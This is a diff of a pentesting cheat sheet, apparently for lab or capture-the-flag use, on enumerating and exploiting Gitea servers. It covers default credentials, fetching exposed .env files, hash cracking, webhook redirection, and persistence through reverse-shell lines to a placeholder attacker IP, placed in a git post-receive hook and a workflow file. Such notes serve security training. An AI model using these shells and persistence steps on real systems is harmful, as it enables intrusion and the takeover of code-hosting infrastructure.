@@ -1,4 +1,4 @@
-# Gitea – Self-hosted Git Service
+# Gitea Enumeration & Exploitation
 
 !!! tip "Tip"
     Check for public repos and exposed `.git` directories first. Gitea's explore page (`/explore/repos`) is unauthenticated by default — look for private-looking repos that were accidentally made public.
@@ -7,27 +7,26 @@
     Gitea admin credentials are often default (`admin:admin` or `gitea:gitea`) on self-hosted instances spun up quickly for labs or internal tools.
 
 ---
+
 ## Enumeration
 
 ### Identify Gitea Running on Target
 
-#### Look for these indicators:
+Look for these indicators:
 
 - Login page at `/user/login`
-    
 - URL patterns like:
-    
-    ```
-    http://$IP:3000/
-    http://$IP/user/<username>
-    http://$IP/api/v1/users
-    ```
-    
 
-#### HTTP Headers:
+    ```
+    http://10.10.10.10:3000/
+    http://10.10.10.10/user/<user>
+    http://10.10.10.10/api/v1/users
+    ```
+
+#### HTTP Headers
 
 ```bash
-curl -I http://$IP:3000
+curl -I http://10.10.10.10:3000
 ```
 
 Example:
@@ -40,16 +39,14 @@ Set-Cookie: i_like_gitea=...
 #### Nmap HTTP Title Scan
 
 ```bash
-nmap -p 3000 --script http-title $IP
+nmap -p 3000 --script http-title 10.10.10.10
 ```
 
 #### Check for Docker
 
-Look for exposed Docker container info or `docker-compose.yml` for Gitea setup:
-
 ```bash
-curl http://$IP:3000/.env
-curl http://$IP:3000/docker-compose.yml
+curl http://10.10.10.10:3000/.env
+curl http://10.10.10.10:3000/docker-compose.yml
 ```
 
 ---
@@ -77,45 +74,38 @@ hashcat -m 10900 gitea.hashes /usr/share/wordlists/rockyou.txt --force
 
 ---
 
-## Exploitation and Lateral Movement
+## Exploitation
 
 ### Common Misconfigurations
 
-#### 1. **Anonymous Access to Public Repos**
+#### Anonymous Access to Public Repos
 
 ```bash
-curl http://$IP:3000/<org>/<repo>/raw/branch/master/.env
-curl http://$IP:3000/<org>/<repo>/archive/master.zip
+curl http://10.10.10.10:3000/<org>/<repo>/raw/branch/master/.env
+curl http://10.10.10.10:3000/<org>/<repo>/archive/master.zip
 ```
 
 Check for:
 
 - Hardcoded secrets, AWS creds
-    
 - SSH private keys
-    
 - DB creds
-    
 - JWT secrets
-    
 - `.gitlab-ci.yml`, `.github/workflows/`, `Dockerfile`
-    
 
-#### 2. **Open Registration + Privilege Escalation**
+#### Open Registration + Privilege Escalation
 
 If registration is allowed:
 
 1. Register a user
-    
 2. Try accessing `/admin` or exploiting insecure direct object references (IDOR)
-    
 
-#### 3. **Exposed Webhooks**
+#### Exposed Webhooks
 
 Look for outbound webhook definitions in:
 
 ```
-http://$IP:3000/<org>/<repo>/settings/hooks
+http://10.10.10.10:3000/<org>/<repo>/settings/hooks
 ```
 
 You may be able to inject or redirect webhooks to attacker-controlled infrastructure for SSRF or command execution in CI/CD setups.
@@ -152,7 +142,7 @@ SELECT * FROM webhook;
 
 ## Persistence Techniques
 
-### Method 1: Create New User
+### Create New User
 
 If you're post-auth and have admin access, create a user with access to all orgs/repos.
 
@@ -160,17 +150,9 @@ If you're post-auth and have admin access, create a user with access to all orgs
 POST /admin/users/new
 ```
 
-### Method 2: Modify Existing Repo
-
-- Add a backdoor script into a repo
-    
-- Create a webhook to auto-trigger malicious actions (RCE in CI/CD)
-    
-
-### Method 3: Reverse Shell via Git Hooks (If Server-Side Exec Enabled)
+### Reverse Shell via Git Hooks (If Server-Side Exec Enabled)
 
 1. Add `post-receive` or `post-commit` hook:
-    
 
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > .git/hooks/post-receive
@@ -178,9 +160,8 @@ chmod +x .git/hooks/post-receive
 ```
 
 2. Push repo and trigger reverse shell.
-    
 
-### Method 4: Abuse Git Actions or Pipelines
+### Abuse Git Actions or Pipelines
 
 Upload `.github/workflows/pwn.yml`:
 
@@ -194,38 +175,3 @@ jobs:
       - run: bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
 ```
 
----
-
-## Tooling
-
-### `sqlite3` – Used to extract hash and user data from `gitea.db`.
-
-### `hashcat` – Crack PBKDF2-SHA256 hashes.
-
-```bash
-hashcat -m 10900 gitea.hashes rockyou.txt
-```
-
-### `gitea-dumper` (Community Tool)
-
-Python tool to dump all public or accessible repos:
-
-```bash
-https://github.com/HightechSec/gitea-dumper
-```
-
-### `git-dumper` – Works against Git services:
-
-```bash
-git-dumper http://$IP/<repo> /tmp/output/
-```
-
-### `subfinder`, `httpx`, `gobuster` – For discovering Gitea on unknown ports or subdomains.
-
----
-
-## References
-
-- HTB Lab Example: [https://0xdf.gitlab.io/2024/12/14/htb-compiled.html](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html)
-    
-- Gitea Docs: [https://docs.gitea.com/installation/install-with-docker](https://docs.gitea.com/installation/install-with-docker)
